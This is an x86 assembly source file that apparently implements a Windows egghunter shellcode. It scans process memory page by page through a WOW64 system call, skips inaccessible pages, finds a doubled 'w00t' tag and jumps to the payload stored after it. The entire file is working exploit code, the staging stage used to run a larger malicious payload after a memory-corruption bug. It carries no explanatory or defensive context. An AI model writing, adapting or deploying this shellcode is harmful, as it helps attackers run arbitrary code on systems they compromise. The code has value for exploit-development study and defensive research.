BITS  32
global  _start      ; must be declared for linker (ld)
section  .text

_start:             ; tell linker entry point
    xor ebx, ebx
    xor edx, edx
    push ebx
    push ebx
    push ebx
    push ebx
    mov bl, 0xc0
page_invalid:
    or dx, 0xfff
page_valid:
    inc edx
    push edx
    push byte +0x26
    pop eax
    xor ecx, ecx
    mov edx, esp
    call [fs:ebx]
    pop esi
    pop edx
    cmp al, 0x5
    jz page_invalid
    mov eax, 0x74303077
    mov edi, edx
    scasd
    jnz page_valid
    scasd
    jnz page_valid
    jmp edi
